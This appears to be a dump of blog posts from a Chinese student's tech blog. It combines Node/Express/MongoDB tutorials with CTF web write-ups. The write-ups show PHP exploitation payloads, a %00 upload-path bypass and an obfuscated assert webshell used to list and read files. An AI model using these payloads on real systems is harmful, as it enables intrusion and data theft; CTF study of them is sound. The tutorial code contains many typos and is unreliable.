'success');&#125;); find.js//查询1234567891011121314var mongoose = require('mongoose');require('./model.js);var Book = mongoose.model('Book');Book.find(&#123;&#125;,function(err,docs)&#123; if(err)&#123; console.log('err:', err); return; &#125; console.log('result',docs);&#125;);//&#123;&#125;为空查询所有 findone.js//只返回第一满足条件的123456789101112131415`var mongoose = require('mongoose');require('./model,js');var Book = mongoose.model('Book');Book.findOne(&#123;author:\"Jim\"&#125;,function(err,doc)&#123; if(err)&#123; console.log('err',err); return; &#125; doc.author = 'Jame';//可以直接在这修改 doc.save();// console.log('findOne result: ',doc);&#125;); remove.js12345678910111213141516var mongoose = require('mongoose');require('./model.js');var Book = mongoose.model('Book');Book.findOne(&#123;author: 'Jim'&#125;,function(err,doc)&#123; if(err)&#123; console.log('findOne err:', err); return; &#125; if(doc)&#123; doc.remove(); &#125;&#125;); condition.js//条件 以 find为例1234567891011121314151617181920var mongoose = require('mongoose');require('./model.js);var Book = mongoose.model('Book');var cond = &#123; $or: [ &#123;author: 'Jame'&#125;, &#123;author: 'Jim'&#125; ]&#125;;Book.find(cond,function(err,docs)&#123; if(err)&#123; console.log('find by cond err:', err) return; &#125; console.log('cond:', cond,'result:', docs);&#125;); 在express中使用用express新建项目 新建 config文件夹 新建 config.js 123module.exports = &#123; mongodb: \"mongodb://localhost/文件夹名\"&#125;; 同一目录下新建mongoose.js 12345678var mongoose = require('mongoose');var config = require('./config.js');model.exports = function()&#123; var db = mongoose.connect(config.mongodb); return db;&#125;; 在models目录下新建 user.server.model.js 12345678910var mongoose = require('mongoose');var UserSchema = new mongoose.Schema(&#123; uid: Number, username: String, createTime: Date, loastLogin: Date&#125;);mongoose.model('User',UserSchema); 修改 mongoose.js 做相应引用 123456789var mongoose = require('mongoose');var config = require('./config.js');model.exports = function()&#123; var db = mongoose.connect(config.mongodb); require('../model/user.server.model.js'); return db;&#125;; 把mongoose的配置加入应用在 app.js中加入 123var mongoose = require('./config/mongoose,js');var db = mongoose(); CMS后端实现项目的初始化npm init 根据提示输入参数 建立package.json文件 入口设置为 bin/www 与默认生成的保持一致 项目结构创建 bin文件夹 config文件夹 app文件夹(放后端文件) config文件夹内 创建 env环境变量目录 在 env下创建 development.js文件 123`module.exports = &#123; port: 7101;&#125; 在 config文件夹下 创建config.js文件 读取环境变量 通过设置不同的env可以读取不同的配置文件 123456789var config = null;if(process &amp;&amp; process.env &amp;&amp; process.env.NODE_ENV)&#123; config = require('./env/' + process.env.NODE_ENV + '.js');&#125; else&#123; config = require('./env/development.js');&#125;module.exports = config; 在 config文件夹下创建 express.js文件 123456789101112131415161718192021222324252627282930var express = require('express');var bodyParser = require('body-parser');module.exports = function()&#123; console.log('init express...'); var app = express(); app.use(bodyParser.json()); app.use(function(req,res,next)&#123; res.status(404); try &#123; return res.json('Not Found'); &#125; catch(e)&#123; console.error('404 set header after sent'); &#125;&#125;); app.use(function(err,req,res,next)&#123; if(!err)&#123;return next()&#125; res.status(500); try&#123; return res.json(err.message || 'server error'); &#125; catch(e)&#123; console.error('500 set header after sent'); &#125;&#125;); return app;&#125;; 老的express的系统入口是app.js 所以保留了这个 在根目录下创建 app.js 12345var expree = require('./config/express');var app = expree();module.exports = app; 在 bin文件夹下创建 www 文件 123456var app = require('../app');//类似app.js 扩展名可以省掉var config = require('../config/config');app.listen(config.port, function()&#123; console.log('app started, listening on port',config.port);&#125;); 安装相应模块 npm install express –savenpm install body-parser –save 启动 nodemon bin/www 访问 curl http://localhost:7101 api实现app文件夹下创建 controllers文件夹 models文件夹 routes文件夹 在 models文件夹内创建 news.server.model.js 123456789var mongoose = require('mongoose');var NewSchema = new mongoose.Schema(&#123; title: String, content: String. createTime: &#123;type: Date, default: Date.now&#125;&#125;);var News = mongoose.model('News',NewsSchema);//News为模型名 在 config下env下 创建 mongoose.js 12345678910var mongoose = require('mongoose');var config = require('./config');module.exports = function()&#123; var db = mongoose.connect(config.mongodb); require('../app/model/news.server.model');return db;&#125;; 修改 development.js文件 123module.exports = &#123; port: 7101, mongodb: 'mongodb://localhost/生成项目时的项目名' 修改 app.js文件 1234567var express = require(./config/express);var mongodb = require('./config/mongoose');var db = mongodb();var app = express();module.exports = app; 在 app文件夹下 controllers文件夹下创建 news.server.controller.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344var mongoose = require('mongoose');var News = mongoose.model('News');model.export = &#123; create: function(req,res,next)&#123; var news = new News(req.body); news.save(function(err)&#123; if(err) return next(err); return res.json(news); &#125;); &#125;, list: function(req,res,next)&#123; var pagesize = parseInt(req.query.pagesize,10) || 10; var pagestart = parseInt(req.query.pagestart,10) || 1; News .find() .skip( (pagestart - 1)*pagesize ) .limit(pagesize) .exex(function(err,docs)&#123; if(err) return next(err); return res.json(docs); &#125;); &#125;, getById: function(req,res,next,id)&#123; if(!id) return next(new Error('News not Found')); News .findOne(&#123;_id: id&#125;) .exec(function(err, doc)&#123; if(err) return next(err); if(doc) return next(new Error('News not Found')); req.news = doc; return next(); &#125;);&#125;, get: function(req,res,next)&#123; return res.json(req.news); &#125;&#125;; 在routes文件夹下 创建news.server.routes.js 12345678910111213var NewsController = require('../controllers/news.server.controller');model.exports = function(app)&#123; app.route('/news') .get(NewsController.create); .post(NewsController.create);&#125;; app.route('/news/:nid') .get(NewsController.get); app.param('nid', NewsController.getById);&#125;; 修改 express.js文件 1234567891011121314151617181920212223242526272829303132var express = require('express');var bodyParser = require('body-parser');module.exports = function()&#123; console.log('init express...'); var app = express(); app.use(bodyParser.json()); require('../app/routes/news.server.routes')(app);//新加的 app.use(function(req,res,next)&#123; res.status(404); try &#123; return res.json('Not Found'); &#125; catch(e)&#123; console.error('404 set header after sent'); &#125;&#125;); app.use(function(err,req,res,next)&#123; if(!err)&#123;return next()&#125; res.status(500); try&#123; return res.json(err.message || 'server error'); &#125; catch(e)&#123; console.error('500 set header after sent'); &#125;&#125;); return app;&#125;; npm install mongoose –save 访问 curl http://localhost:7101/news 以POST方式提交数据 curl -X POST -H ‘Content-Type: application’ -d ‘{“title”: “test title”,”content”: test content}’ localhost:7101/news 小结大概一周的时间了解了一下node项目的基础 但是实验室的项目需求刚刚变成java 刚学的这方面暂时用不到了23333 但是还是手动跟着讲解视频敲完了代码 以后如果有遇到node.js的 方便温习","categories":[{"name":"node.js","slug":"node-js","permalink":"http://Merl1ng.com/categories/node-js/"}],"tags":[{"name":"express","slug":"express","permalink":"http://Merl1ng.com/tags/express/"},{"name":"mongodb","slug":"mongodb","permalink":"http://Merl1ng.com/tags/mongodb/"},{"name":"mongoose","slug":"mongoose","permalink":"http://Merl1ng.com/tags/mongoose/"}]},{"title":"express+mongodb极简入门","slug":"express-mongodb极简入门","date":"2017-10-13T14:53:42.000Z","updated":"2017-10-22T14:22:52.349Z","comments":true,"path":"2017/10/13/express-mongodb极简入门/","link":"","permalink":"http://Merl1ng.com/2017/10/13/express-mongodb极简入门/","excerpt":"安装 mongodb安装后加入环境变量方便启动","text":"安装 mongodb安装后加入环境变量方便启动 启动数据库需要以管理员身份运行 配置好后直接 net start MongoDB 首先新建数据表 cmder下 依次输入 mongouse blog //创建名为blog的数据库db.users.insert({“name”:”petr”,”age”:”26”,”level”:”master”});//创建名为users的集合(数据表)db.users.find();//查看数据 还有db.users.drop();//删除当前数据表若想以数字形式操作 数字不加”” 如 “number”:0 mongodb基础操作使用BSON储存数据 即二进制的JSON 无模式 支持索引 mongo 或指定服务器和端口 mongo 127.0.0.1:27017 show dbs 查看数据库 use 某一数据库后 可以 show collections 查看集合 db.users.find().count(); 查看数量 db.users.find({“_id” : ObjectId(“55bdxxxxxxxxxxxxxxx”)}); 通过_id条件查询 db.users.update() 更新数据 三个参数 条件 更新的内容 (配置) db.users.update({“username” : “Zoe”},{$set: {“group”: “writer”}});此时只改满足条件的第一个 db.users.update({“username” : “Zoe”},{$set: {“group”: “writer”}}，{multi: true});此时全改 db.users.save({_id: ObjectId(“5xxxxxxxxxxxxxxxxxxx”),”group” : “programmer”});必须有_id参数才能使用 但此时其他未指定的参数全部默认删除 db.users.remove({“group”: “reporter”}); 把所有符合条件的全删了 db.users.remove({“group”: “reporter”},true); 只删满足条件的第一个 db.users.remove({});只删文档 不删索引 db.users.drop();删所有 安装 express+Mongoose//全局安装expressnpm install express -g //安装express全局生成器，可以自动生成项目文件npm install express-generator -g 下面在当前工作目录生成一个叫做blog的项目，并采用ejs模版 // 默认是jade模版， -e就是采用ejs模版 express帮我们创建了一个完整的项目级目录express -e blog //进入项目文件夹cd blog //安装所有依赖npm install npm start//启动 //安装Mongoose, –save把Mongoose模块加入到项目依赖npm install mongoose –save 可以看到生成项目的目录 www文件就是启动文件 node_modules 存放所有项目的依赖 public为静态资源存放目录，可以修改 routes为路由文件 views就是视图了（页面文件，ejs模板） express操作mongodb修改routes/index.js 12345678910111213141516171819202122232425var express = require('express');//node语法，意思是引用依赖Express。我们将其保存成变量，以备之后的需要var router = express.Router();//mongodbvar mongoose = require('mongoose');mongoose.Promise = global.Promise; var conn = mongoose.connect('mongodb://127.0.0.1:27017/blog');var User = new mongoose.Schema(&#123;//使用mongoose name: String, age: String, level: String&#125;);var myModel = conn.model('user', User);/* GET index listing. */router.get('/', function(req, res, next) &#123; myModel.findOne(&#123;name:\"petr\"&#125;, function (err, user) &#123; console.log(user); res.render('index', &#123;title: 'Express', user: user &#125;); &#125;);&#125;);module.exports = router; 修改wiew/index.ejs 12345678910111213&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel='stylesheet' href='/stylesheets/style.css' /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;p&gt;姓名：&lt;%= user.name %&gt;&lt;/p&gt; &lt;p&gt;年龄：&lt;%= user.age %&gt;&lt;/p&gt; &lt;p&gt;等级：&lt;%= user.level %&gt;&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 启动服务器即可看到效果 另外一个入门项目本来是想单独整理出来的 但是原作者真的写得很细致了 看原版就很舒服~ 这个项目没有用express自动生成项目目录 而是手工完成 可以更好地理解每个部分的原理 http://www.jianshu.com/p/b4256fb0847a 作者的地址 不但写得很细致 并且告诉了各个部分的原理 不过有些地方代码有些小错误 需要自己改正或补全 通过一些案例也理解了一些使用文档型数据库mongodb搭配node的优点和它对JavaScript和Json的原生支持 这个小项目完成后效果是这个样子的 数据库里刚开始放的是 { “_id” : ObjectId(“59e230943339db05b4c01d74”), “clicks” : 0 } 注意如果手动insert 0不要带”” 一开始就因为这里报错了没成功 这个项目的目标是 记录按钮被按下的次数 在数据库中储存 重新设置计数为0 在程序的内容中，我们要做到以下： Node/Express网站服务用来响应HTTP要求，以及传文件给浏览器 MongoDB数据库用来存储点击的次数 服务端controller(控制器)可以添加，可以重设，可以接受来自数据库的记录 数据将会传给API 客户端控制器使用暴露的API能够根据用户的输入响应不同的内容 客户端能都给用户显示界面 HTML页面要包含一个logo以及用户交互的按钮","categories":[{"name":"node.js","slug":"node-js","permalink":"http://Merl1ng.com/categories/node-js/"}],"tags":[{"name":"express","slug":"express","permalink":"http://Merl1ng.com/tags/express/"},{"name":"mongodb","slug":"mongodb","permalink":"http://Merl1ng.com/tags/mongodb/"}]},{"title":"世安杯writeup","slug":"世安杯writeup","date":"2017-10-08T14:49:53.000Z","updated":"2017-10-22T16:03:19.311Z","comments":true,"path":"2017/10/08/世安杯writeup/","link":"","permalink":"http://Merl1ng.com/2017/10/08/世安杯writeup/","excerpt":"原题蛮多的 web和misc做了点 然后就滚去写物理报告了..","text":"原题蛮多的 web和misc做了点 然后就滚去写物理报告了.. web 1找到源码 12345678910111213141516171819202122232425&lt;?php$flag = '*********';if (isset ($_GET['password'])) &#123; if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) echo '&lt;p class=\"alert\"&gt;You password must be alphanumeric&lt;/p&gt;'; else if (strpos ($_GET['password'], '--') !== FALSE) die($flag); else echo '&lt;p class=\"alert\"&gt;Invalid password&lt;/p&gt;';&#125;?&gt;&lt;section class=\"login\"&gt; &lt;div class=\"title\"&gt; &lt;a href=\"./index.phps\"&gt;View Source&lt;/a&gt; &lt;/div&gt; &lt;form method=\"POST\"&gt; &lt;input type=\"text\" required name=\"password\" placeholder=\"Password\" /&gt;&lt;br/&gt; &lt;input type=\"submit\"/&gt; &lt;/form&gt;&lt;/section&gt;&lt;/body&gt;&lt;/html&gt; 直接?password[]=就能绕过 也可以利用%00截断ereg，构造?password=1%00– 因为ereg函数存在NULL截断漏洞 导致了正则过滤被绕过 stropos()不受影响 web 2cookie 两句关键代码if(isset($_COOKIE[‘key’]) &amp;&amp; $_COOKIE[‘key’]==’li_lr_480’){ thisis_flag.php 把thisis_flag.php base64加密后和cookie一起替换 web 3综合题目 123456789101112&lt;?phpclass Read&#123;//f1a9.php public $file; public function __toString()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; return \"__toString was called!\"; &#125;&#125;?&gt; 1234567891011121314151617181920212223242526272829&lt;?php$user = $_GET[\"user\"];$file = $_GET[\"file\"];$pass = $_GET[\"pass\"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"the user is admin\"))&#123; echo \"hello admin!&lt;br&gt;\"; if(preg_match(\"/f1a9/\",$file))&#123; exit(); &#125;else&#123; include($file); //class.php $pass = unserialize($pass); echo $pass; &#125;&#125;else&#123; echo \"you are not admin ! \";&#125;$user = $_GET[\"user\"];$file = $_GET[\"file\"];$pass = $_GET[\"pass\"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"the user is admin\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //class.php&#125;else&#123; echo \"you are not admin ! \";&#125;?&gt; misc 1提示 low -&gt; lsb 先利用ps把bmp格式另存为 png 然后stegsolve即可拿到二维码 misc 2斑马 直接在线扫条形码 misc 3图片隐写 找到二维码 扫描得到一串十六进制数 查一下最开头几位 发现是pyc文件 winhex另存为timu.pyc 然后pyc反编译(这个库之前做题安装过) uncompyle2 -o 1.py timu.pyc misc 4文件倒置 winhex打开发现最开始是D9FF 最末尾是D8FF 反过来FF8D FF9D 就是jpg文件的文件头和文件尾 先新建一个a空文件 f=open(‘b’,’wb’)f.write(open(‘a’,’rb’).read()[::-1]) misc 5这题 无力吐槽 珍妮换了一个新的QQ号码，原来的号码和新的号码都是5位靓号哦；其次，新的号码是原来号码的4倍，并且原来的号码倒着写正好是新的号码，请问，新号码是多少，新号码即为key 掏出c语言打一发 87912 misc6拼接二维码 这题是别人的writeup 我本来以为是图片大小被修改没显示 后来才发现 少的地方刚好是三块回型的块23333","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"}]},{"title":"php代码审计Ⅲ","slug":"php代码审计Ⅲ","date":"2017-10-04T09:25:49.000Z","updated":"2017-10-05T05:27:51.630Z","comments":true,"path":"2017/10/04/php代码审计Ⅲ/","link":"","permalink":"http://Merl1ng.com/2017/10/04/php代码审计Ⅲ/","excerpt":"如何学习php? 打ctf…","text":"如何学习php? 打ctf… 综合题目12345678910$user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; 首先利用 file_get_contents结合php://input 加上 include($file)文件包含 拿到下一步的base64加密过的代码 (太长了没截完) 解密后是这个样子的 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"good\"); &#125; &#125; &#125; ?&gt; 发现了经典的__toString事件，但是没有触发的条件 index.php应该还藏着东西，于是查看得到 1234567891011121314151617181920212223242526272829303132&lt;?php $txt = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello friend!&lt;br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; echo \"不能现在就给你flag哦\"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo \"you are not the number of bugku ! \"; &#125; ?&gt; &lt;!-- $user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; 就是输出反序列化的时候会触发__toString属性 构造 password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} (O因为Flag是对象)(Flag后面的数字我目前的理解是分号个数除以二) 这时就别再php://filter读文件源码了 包含进去就行 (file=hint.php) 查看源码拿到flag php反序列化漏洞http://blog.csdn.net/qq_32400847/article/details/53873275 __toStringhttp://www.jb51.net/article/99351.htm 正则表达式12345678 &lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match(\"/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);if( $IM )&#123; die('key is: '.$key);&#125;?&gt; 1234567891011121314151617181920212223241./是正则表达式分界符，两个/里面的内容是正则表达式 表达式直接写出来的字符串直接利用，如key2.\".\"匹配除换行符 \\n 之外的任何单字符3.\"*\"匹配前面的子表达式零次或多次。例如，zo* 能匹配 \"z\" 以及 \"zoo\"。* 等价于&#123;0,&#125;合起来.*代表贪婪匹配 如下面的表达式匹配从开始小于符号 (&lt;) 到关闭 H1 标记的大于符号 (&gt;) 之间的所有内容。/&lt;.*&gt;/4.\"\\/\"代表\"/\" 表示将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， 'n' 匹配字符 'n'。'\\n' 匹配换行符。序列 '\\\\' 匹配 \"\\\"，而 '\\(' 则匹配 \"(\"5.[a-z]代表a-z中的任意一个字符6.[[:punct:]]代表任意一个字符，包括各种符号7./i代表大小写不敏感叫做修正符 更多看这篇http://www.cnblogs.com/kevin-yuan/archive/2012/09/25/2702167.html8.&#123;4-7&#125;代表[0-9]中数字连续出现的个数是4-7个 顺带一提与 * 区别的是 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,} 构造方式有很多?id=keyakey1236key:/a/keya$","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"php代码审计Ⅱ","slug":"php代码审计Ⅱ","date":"2017-10-04T08:47:31.000Z","updated":"2018-03-04T15:09:44.556Z","comments":true,"path":"2017/10/04/php代码审计Ⅱ/","link":"","permalink":"http://Merl1ng.com/2017/10/04/php代码审计Ⅱ/","excerpt":"写在一起看的时候不方便 所以又开了一篇","text":"写在一起看的时候不方便 所以又开了一篇 挺杂的一道右键源码 提示1p.html 但是输进去会跳转到别的网页 所以要么burp抓包 要么先在别的页面查看源码 在源码页面里输入网址 可看到加密过的代码 先 base64再urldecode 得到源码 1234567891011121314151617181920212223242526&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)&#123; require(\"f4l2a3g.txt\");&#125;else&#123; print \"never never never give up !!!\";&#125;?&gt; 分析1.id==0 用0==字符串绕过 因为有(!$_GET[‘id’])不能直接输入0 也可以用.绕过 即id=. 2.stripos过滤了’.’，估计是不能用文件包含的，所以我们要用php伪协议post一个Data $data = @file_get_contents($a,’r’);$data==”bugku is a nice plateform!” 这个利用了file_get_contents的特性，当用到php://input的时候，file_get_contents支持字节流输入， 只要将a设为php://input,且post过去bugku is a nice plateform!即可 3.strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4 strlen对%00不截断，而eregi对%00截断，只要构造b=%00+大于4位的串即可(之所以要大于四位我感觉是因为在以get方式传参时%00被解码成了一个字符) 用hackbar即可 burp抓包改也是可以的 (记得把左上角的GET改成POST) (有时候burp会不成功 重新退出进下或许可以) 后来知道这破题直接访问f4l2a3g.txt也行… 120.24.86.145:8006/test/f4l2a3g.txt 也能看到flag 以下是对代码中函数或技巧的单独分析 substr($id,0,-1) substr — 返回字符串的子串就是截取字符串$id，获取从第一位到倒数第二位 0是第一位，-1是倒数第二位 stripos()查找字符串在另一字符串中第一次出现的位置（不区分大小写） 相关函数：strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写） .绕过接收参数 $a 得存在，并且 $a==0 可用. 绕过（非数字都可绕过） &lt;?php$a = $_GET[‘a’];if ($a == 0) { echo “1”;}if ($a) { echo “miao”;}?&gt; php://input接收参数中不能出现某一字符，但下面又必须使用可以 php:// 伪协议绕过 目前遇到的是 file_get_contents eregi%00 截断绕过 (这点还不太懂 Orz.) 有关php黑魔法(这玩意真是总结不完) 暗羽表姐的博客里也有不少关于这道题的总结http://www.zjicmisa.org/index.php/archives/112/ file_get_contents(“php://input”)和extract()123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo \"&lt;p&gt;This is flag:\" .\" $flag&lt;/p&gt;\";&#125;else&#123;echo \"&lt;p&gt;sorry!&lt;/p&gt;\";&#125;&#125;?&gt; 先从file_get_contents(“php://input”)说前面题目中有过php中file_get_contents的特性可以使用字节流 再看另外一种方法extract()函数导致的变量覆盖漏洞 (但是这题不行 因为if (!empty($ac))这句) 首先介绍一下extract()函数的作用 extract() 函数从数组中将变量导入到当前的符号表 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量 来看一道很相似的题目 但是没有非空判断 1234567891011121314&lt;?php$filename='test.txt';extract($_GET);if(isset($attempt))&#123; $combination=trim(file_get_contents($filename)); if($attempt===$combination)&#123; echo \"&lt;p&gt;How did you know the secret combination was\" . \"$combinnation !?&lt;p&gt;\" ; $next = file_get_contents('password.txt'); echo \"&lt;p&gt;You've earned the password.\" . \"$next&lt;/p&gt;\"; &#125;else &#123; echo \"&lt;p&gt;Incorrect! The secret combiantion is not $attempt&lt;/p&gt;\"; &#125;&#125;?&gt; 首先注意 这里用的是 isset而不是empty isset()函数 一般用来检测变量是否设置 若变量不存在则返回 FALSE若变量存在且其值为NULL，也返回 FALSE若变量存在且值不为NULL，则返回 TURE同时检查多个变量时，每个单项都符合上一条要求时才返回 TRUE，否则结果为 FALSE empty()函数 判断值为否为空 若变量不存在则返回 TRUE若变量存在且其值为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 TURE若变量存在且值不为””、0、”0”、NULL、、FALSE、array()、var $var; 以及没有任何属性的对象，则返回 FALSE 在第三行, 运用了extract()函数, 将GET方式获得的变量导入到当前的符号表中 然后判断$attempt与$combination两个变量的内容是否相等. $combination变量储存的是test.txt的内容. 但是我们并不能查看test.txt, 所以并不知道该怎么去设 置$attempt的值. 但是, 由于extract()函数的不足之处, 导致这段代码存在一个变量覆盖漏洞 只要我们这样构造url/?attempt=&amp;filename= 那么, 我们可以发现, $attempt变量和$combination变量的内容都会被设置成空字符串 这样, Line 6 的判断就成立了, 我们就能成功地拿到password.txt的内容 话说变量覆盖漏洞还见过一种解法 有文件情况下直接读文件文件http://bobao.360.cn/news/detail/796.html 后记由此我想 file_get_contents是不是本身只能读文件 但是加上php://input 就可以 读post的数据？ file_get_contents()http://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp file_get_contents(“php://input”)http://blog.csdn.net/zhouminit/article/details/53044316 file_get_contents(“php://input”, “r”)http://blog.csdn.net/motian06/article/details/8207923 有待总结","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"杂七杂八的web","slug":"杂七杂八的web","date":"2017-10-03T08:30:49.000Z","updated":"2017-10-24T16:08:57.550Z","comments":true,"path":"2017/10/03/杂七杂八的web/","link":"","permalink":"http://Merl1ng.com/2017/10/03/杂七杂八的web/","excerpt":"burp 爆破","text":"burp 爆破 题目页面提示爆破 且为五位数密码 burp抓包 Send to Intruder 点击Positions 先点右侧 clear $ 清除所有变量 然后在你想爆破的位置点两个 Add $ 再到Payloads 先试试纯数字 再到 Options下 Number of threads 代表线程数 Number of retries on network 代表如果出现连接错误或其他网络问题,BurpSuite会放弃和移动之前重试的请求指定的次数 设置完后点击 Start attack开始爆破 按长度排一下 伪造登陆地址题目要求.NET FRAMEWORD 9.9框架 在英格兰地区 IE浏览器 对于.NET FRAMEWORD 9.9框架 可以查到在安装了.NET Framework后 MSI会将.NET CLR和版本号添加到UserAgent字符串中 抓包 所以要加上 .NET CLR 9.9 英国的话将语言改为 en-gb ie浏览器 MSIE 8.0; (版本号无所谓) 放包即可拿到flag 相关知识点Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)表示的含义为 Mozilla/5.0 一种浏览器的名称compatible 适合的;兼用的MSIE8.0 微软公司出品的IE浏览器8.0版本Windows NT 5.1 微软公司出品的服务器操作系统(xp)SV1=Security Version 1 安全版本1 题外话为什么IE浏览器的UA也是“Mozilla/4.0”打头的呢？第一轮浏览器大战最后以Netscape被收购，Internet Explorer独霸浏览器市场告终。而此时Mozilla的历史正是由这里开始。浏览器之战失利以后，Netscape并没有消失，为了挽回市场，1998年Netscape将浏览器的大部分代码开源，成立了一个组织，计划开发下一代的 Netscape浏览器，这个组织就是Mozilla.org，它的图标是一只恐龙。不久后，Netscape的源代码就差不多被全部抛弃， Mozilla社团开发出了在稳定性和功能上更出色的新一代浏览器。这个浏览器就是Mozilla Application Suite，简称Mozilla（Mozilla这个名字的来源是Mosaic和Godzilla（怪兽哥斯拉）两个词的结合，意为 “Mosaic终结者”。 起初，Mozilla是Netscape的吉祥物，也是Netscape Navigator浏览器使用的内部开发代号。由于Netscape早期的影响力，直到今天，所有浏览器包括IE，向Web服务器报告自己的浏览器标识的时候，都以 “Mozilla”开头，表明自己是Mozilla兼容的。 文件上传绕过这个的绕过方式比较奇怪 不是改文件名 而是修改文件的上传路径 因为先检查文件名后缀 所以文件名就为1.jpg 传上去之后还会再次检查文件后缀 又要求是php 所以这时只能再从文件上传的路径下手 改路径也是用到%00截断 但是不是直接打%00 因为 直接加%00相当于加了’%’’0’’0’这三个字符，但你实际需要做的是加入%00这个截断符 两种方法 其一是先打%00 curl+shift+u 利用burp自带的urlcode解码 其二是 进入hex 先找到1.php 即 70 68 70 (16进制) 在后面点 insert byte 之后效果是这样的 forward就可以啦 robots.txt很关键的一个技巧 但是容易忘 页面没啥下一步的提示时 试试robots.txt总没错 一句话利用题目说 送给大家一个过狗一句话&lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) ?&gt; http://120.24.86.145:8010/?s=phpinfo() 发现已经上传好了 可以直接利用 先尝试读取文件目录 ?s=system(‘ls’) 发现不行 改为 ?s=print_r(glob(“*”)) 123456789101112131415例子 1&lt;?phpprint_r(glob(\"*.txt\"));?&gt;输出类似：Array ( [0] =&gt; target.txt [1] =&gt; source.txt [2] =&gt; test.txt [3] =&gt; test2.txt )例子 2&lt;?phpprint_r(glob(\"*.*\"));?&gt;输出类似：Array ( [0] =&gt; contacts.csv [1] =&gt; default.php [2] =&gt; target.txt [3] =&gt; source.txt [4] =&gt; tem1.tmp [5] =&gt; test.htm [6] =&gt; test.ini [7] =&gt; test.php [8] =&gt; test.txt [9] =&gt; test2.txt ) 很明显要读取flag.txt里面的内容 ?s=print_r(file(flag.txt)) 不行 ?s=show_source(“flag.txt”) 成功 看到了flags 302重定向flag藏在302界面的响应头里 有关302可以看这篇 http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html php浮点数12345678$usera = ($_POST['userid']); if(isset($usera))&#123; if ($usera == \"1\")&#123; $usera = (int)($usera); if($usera == \"0\")&#123; header('Location: ./bhjskdfiffeswdwe.php'); &#125; &#125; hackbar里post userid=0.99999999999999999（小数点后至少有17位）即可满足代码跳转","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"burp","slug":"burp","permalink":"http://Merl1ng.com/tags/burp/"}]},{"title":"找源码的web题目","slug":"找源码的web题目","date":"2017-09-16T04:09:49.000Z","updated":"2017-10-20T04:28:19.064Z","comments":true,"path":"2017/09/16/找源码的web题目/","link":"","permalink":"http://Merl1ng.com/2017/09/16/找源码的web题目/","excerpt":"vim不正常退出","text":"vim不正常退出 这个知识点当年学长出过题目 卡死在前面少加了一个 . 心中一万个xxx 这几天做题终于又遇到了 